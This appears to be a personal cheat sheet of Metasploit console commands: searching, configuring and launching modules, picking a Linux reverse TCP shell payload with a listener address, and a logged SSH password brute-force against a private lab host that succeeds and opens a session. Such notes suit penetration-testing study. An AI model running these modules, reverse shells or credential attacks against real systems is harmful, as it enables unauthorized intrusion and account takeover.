# MSFConsole

[Metasploit Framework](https://github.com/rapid7/metasploit-framework)

### Open the console:
```
# running as sudo lets you use ports below 1024
sudo msfconsole
```

### Update the exploit database:
```
msfupdate
```

### Search for exploits:
```
search rlogin

# search explicitly by type
search rlogin type:exploit
```

### View more information about an exploit:
```
info {exploit_name}

Example:
info auxiliary/scanner/rservices/rlogin_login
```

### View the source of an exploit:
```
edit
```

### Use an exploit:
```
use {exploit_name}

Example:
use auxiliary/scanner/rservices/rlogin_login
```

### Show the options of an exploit:
```
show options
```

### Set an option in an exploit:
```
set PASSWORD password123
```

### Select a payload:
```
>> show payloads
>> set payload payload/linux/x64/shell_reverse_tcp
```

### Set an option globally:
```
setg LHOST 192.168.199.128
```

### Launch an exploit:
```
exploit {ip_address}

Example:
exploit 192.168.199.132
```
OR
```
run {ip_address}

Example:
run 192.168.199.132
```

### See the targets that an exploit affects:
```
show targets
```

### Run exploits over SSH:
```
[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/ssh/ssh_login
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set rhosts 192.168.199.129
rhosts => 192.168.199.129
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set username admin
username => admin
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set password abc123
password => abc123
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> exploit

[*] 192.168.199.129:22 - Starting bruteforce
[+] 192.168.199.129:22 - Success: 'admin:abc123' 'uid=1005(admin) gid=1005(admin) groups=1005(admin) Linux fsociety 5.13.0-37-generic #42~20.04.1-Ubuntu SMP Tue Mar 15 15:44:28 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 1 opened (192.168.199.130:38363 -> 192.168.199.129:22) at 2023-04-05 20:50:54 -0700
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
